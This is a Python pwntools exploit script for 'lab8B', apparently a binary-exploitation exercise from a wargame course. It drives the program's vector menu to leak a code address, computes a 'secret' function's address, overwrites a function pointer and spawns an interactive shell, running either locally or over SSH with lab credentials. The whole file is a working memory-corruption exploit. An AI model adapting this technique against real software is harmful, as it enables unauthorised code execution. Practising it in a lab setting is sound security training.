#!/usr/bin/env python2

from pwn import *

# == How to use ==
# python ssh.py LOCAL
# python ssh.py REMOTE IP=127.0.0.1 USER=challenge PASS=challenge
# python ssh.py REMOTE IP=127.0.0.1 PORT=22 USER=challenge PASS=challenge

settings = {

    # Path to binary
    "binary"        : "./lab8B",

    # Path to custom libc
    "libc"          : None,

    # Remote path to binary
    "remote_binary" : "/levels/lab08/lab8B"
}

# Exploit here
def exploit():

    # Enter data in vector #1
    p.sendline("1")
    p.sendline("1")

    # Enter values
    [p.sendline("1") for i in range(9)]

    # Leak binary
    p.sendline("3")
    p.sendline("1")
    p.recvuntil("printFunc: ")
    binary = int(p.recvline().strip(), 16)
    secret = binary - 0x42
    log.info("Binary : {}".format(hex(binary)))
    log.info("Secret : {}".format(hex(secret)))

    # Enter data in vector #2
    p.sendline("1")
    p.sendline("2")

    # Enter values
    p.sendline("R")
    p.sendline("1")
    p.sendline(str((secret & 0xffff) - 1))
    p.sendline(str(((secret & 0xffff0000) >> 16) - 1))
    p.sendline(str(secret - 1))
    p.sendline("5")
    p.sendline("6")
    p.sendline("7")
    p.sendline("8")

    # Do sums
    p.sendline("2")

    # Add to faves
    [p.sendline("4") for i in range(5)]

    # Load fave #5
    p.sendline("6")
    p.sendline("4") # 0 based index
    p.sendline("1") # operand1

    p.clean()

    # Trigger shell
    p.sendline("3")
    p.sendline("1")

    p.interactive()


# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process(binary.path)

    if args['REMOTE']:
        if not all([args.IP, args.USER, args.PASS]):
            log.warning("Missing IP/USER/PASS arguments.")
            exit()


        shell = ssh(args.USER, args.IP, port = int(args.PORT) or 22,
                                    password = args.PASS)

        p = shell.process(settings['remote_binary'])

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
